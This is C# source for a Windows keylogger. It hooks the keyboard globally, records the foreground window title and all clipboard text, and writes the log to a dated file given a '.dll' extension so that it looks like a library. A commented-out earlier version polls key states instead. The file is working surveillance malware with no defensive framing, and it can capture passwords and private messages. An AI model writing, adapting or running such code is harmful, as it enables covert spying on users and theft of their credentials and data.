using Keystroke.API;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using WK.Libraries.SharpClipboardNS;
using static WK.Libraries.SharpClipboardNS.SharpClipboard;

namespace Keylogger
{
    class Program
    {
        string log = string.Empty;
        string currentWindowTitle = string.Empty;


        // Get keys
        /**[DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);**/

        //Get window titles
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [STAThread]
        static void Main(string[] args)
        {
            new Program().start();
        }


        private void start()
        {
            // Clipboard handler
            var clipboard = new SharpClipboard();
            clipboard.ObservableFormats.Texts = true;
            clipboard.ClipboardChanged += ClipboardChanged;


            // Key handler
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => 
                {
                    // Clean the key
                    string character2 = cleanKey(character.ToString());

                    // Get the foreground window's title : https://stackoverflow.com/questions/115868/how-do-i-get-the-title-of-the-current-active-window-using-c
                    string windowTitle = getForegroundWindowTitle();
                    if (windowTitle != currentWindowTitle && windowTitle != "")
                    {
                        currentWindowTitle = windowTitle;
                        log += $"\n\n<newForegroundWindow>{currentWindowTitle}</newForegroundWindow>\n";
                    }

                    // Update the log variable
                    log += character2;

                    // Write logs
                    writeLogs(log);
                });

                Application.Run();
            }

            /**string currentWindowTitle = "";
            bool isShift = false;
            bool isCapital = false;f
            string log = "";

            while (true)
            {
                Thread.Sleep(100);

                for (int keyCode = 0; keyCode < 255; keyCode++)
                {
                    int keyState = GetAsyncKeyState(keyCode);

                    if (keyState != 0)
                    {
                        String keyString = "";

                        // If shift pressed
                        if (
                            (((Keys)keyCode) == Keys.ShiftKey) ||
                            (((Keys)keyCode) == Keys.LShiftKey) ||
                            (((Keys)keyCode) == Keys.RShiftKey)
                        )
                        {
                            isShift = !isShift;
                        }
                        // If capital pressed
                        else if (((Keys)keyCode) == Keys.Capital)
                        {
                            isCapital = !isCapital;
                        }

                        // if letters pressed 
                        if (
                                (!isShift && !isCapital) &&
                                (keyCode >= 65 && keyCode <= 90)
                            )
                        {
                            keyString = ((Keys)keyCode).ToString().ToLower(); // Convert from ASCII to STRING        
                        }
                        else
                        {
                            // Replace caracters
                            if (((Keys)keyCode) == Keys.Space) { keyString = " "; }
                            else if (((Keys)keyCode) == Keys.Enter) { keyString = "\n"; }
                            else if (((Keys)keyCode) == Keys.Tab) { keyString = "\t"; }
                            else if (keyCode == 188) { keyString = ","; }
                            else if (keyCode == 52) { keyString = "'"; }

                            // Ignore the mouse buttons
                            else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; }

                            else if (keyCode >= 96 && keyCode <= 105)
                            {
                                keyString = ((Keys)keyCode).ToString().Substring(6);
                            }

                            else if ((keyCode < 65 || keyCode > 90))
                            {
                                keyString = "<" + ((Keys)keyCode).ToString().ToUpper() + ">";
                            }

                            else
                            {
                                keyString = ((Keys)keyCode).ToString(); // Convert from ASCII to STRING
                            }

                        }

                        // Remove the shift
                        if (
                            (isShift) &&
                            (
                                (((Keys)keyCode) != Keys.ShiftKey) ||
                                (((Keys)keyCode) != Keys.LShiftKey) ||
                                (((Keys)keyCode) != Keys.RShiftKey)
                            )
                        )
                        {
                            isShift = false;
                        }

                        // Get the foreground window's title
                        string windowTitle = getForegroundWindowTitle();
                        if (windowTitle != currentWindowTitle && windowTitle != "")
                        {
                            currentWindowTitle = windowTitle;
                            log = log + $"\n\n[Foreground Window : {currentWindowTitle}]\n";
                        }

                        // Write the log
                        log = log + keyString;

                        // https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
                        string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
                        string fileName = DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
                        File.WriteAllText(Path.Combine(path, fileName), log);


                        Console.WriteLine(log);
                    }
                }
            }**/
        }

        public string cleanKey(string character)
        {
            if (character == "<enter>") { character = "\n"; }
            return character;
        }
        
        public string getForegroundWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            string windowTitle = "";
            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                windowTitle = Buff.ToString();
            }
            return windowTitle;
        }

        
        private void ClipboardChanged(Object sender, ClipboardChangedEventArgs e)
        {
            if (e.ContentType == SharpClipboard.ContentTypes.Text)
            {
                log += "\n<newClipboardText>" + e.Content.ToString() + "</newClipboardText>\n";

                // Write logs
                writeLogs(log);
            }

            else
            {
                Console.WriteLine("no");
            }
        }

        public void writeLogs(string log)
        {
            // Write logs : https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
            string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
            string fileName = "kl-" + DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
            File.WriteAllText(Path.Combine(path, fileName), log);

            Console.WriteLine(log);
        }

    }

   
}
